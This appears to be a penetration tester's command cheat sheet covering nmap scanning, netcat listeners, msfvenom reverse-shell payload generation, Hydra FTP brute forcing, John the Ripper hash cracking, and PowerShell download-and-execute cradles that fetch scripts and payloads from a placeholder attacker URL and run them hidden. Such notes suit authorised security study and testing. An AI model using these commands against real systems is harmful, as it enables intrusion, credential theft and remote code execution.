
# vpn connection

sudo openvpn



# Terminator keybinds 

//move around by word
ctrl + fn + left or right arrow

//delete whole word 
alt + backspace

//split horizontally 
ctrl + super + c

//split vertically
ctrl + super + v

//close terminal
shift + ctrl + w

//restore default zoom
ctrl + 0

//fullscreen a specific pane 
ctrl + shift + Z




# Typical nmap commands 

//update scripts database
nmap --script-updatedb

//ping sweep, we can run this first to discover hosts
nmap -sn 

//also we can try running no ping to see any extra hosts hidden behind firewalls
nmap -n -sn

//we have hosts we can scan targets to check OS and service/version and run default scripts
nmap -T4 -O -sV -sC

//if all ports are filtered on a host be sure to check for openings on udp port 161/ (SNMP)
nmap -sU -p 161,162 




# Netcat commands

//setup listener
nc -lvnp <port>

//file transfer recieving end
nc -l -p 1234 > output.file

//sending end
nc -w 3 [target] 1234 < output.file



# grep for searching through large files

grep -i "string goes here" filename.txt





# SSH tunneling

//-L initiates a tunnel
ssh -L localport:target:remoteport Name@sshserver.com



# smbclient

smbclient \\\\targetmachine\\some-share -U username



# MSF Venom

//create starting payload for BOF -l specifes length/size
msf-pattern_create -l <payloadsize>


//get offset
msf-pattern_offset -l <length> -q <EIP>


//BOF shellcode // -b "\x00" specifies to remove all null bytes, any other bad bytes can be specified also
msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f py -b "\x00"



# add/view routes

route print

ip route add <targetIP> via <gateway>




# Hydra FTP brute forcing

hydra -t 20  -l /home/kali/Desktop/userslist -P /home/kali/Desktop/password.txt -vV <targetIP> ftp


# John The Ripper password cracking 


//this one for windows passwords
john --wordlist=/home/kali/Desktop/rockyou.txt --format=NT /home/kali/Desktop/hashdump.txt

//this one for linux passwords, first unshadow them, then run John

unshadow [passwdfile] [shadowfile] > [output file name]

john --wordlist=/usr/share/john/password.lst [output file name]


# enum4linux 


enum4linux.pl -a <targetIP> | tee enum4linux.log



# PowerShell

// in memory download cradle. if using cmd prompt, use single quotes instead. This downloads and executes a
remotely hosted PS script

PS C:\> iex (New-Object Net.WebClient).DownloadString("http://attacker_url/script.ps1")

//DownloadFile method. Do not use this if trying to remain stealthy. The local var is where the file will be
saved to

PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = "http://attacker_url/payload.exe"
PS C:\> $local_file = "C:\programdata\payload.exe"
PS C:\> $downloader.DownloadFile($payload,$local_file)

//If trying to remain stealthy, also make sure to use the execution policy bypass and window hidden options

C:\> powershell.exe -ExecutionPolicy Bypass -Window Hidden .\downloader.ps1


//there is a powershell port-scanner script if needed in the offensive powershell folder



# Meterpreter 

search -d /pathtobeginsearch -f *.extension

//helpful post-exploit enum scripts here
run post/windows/gather/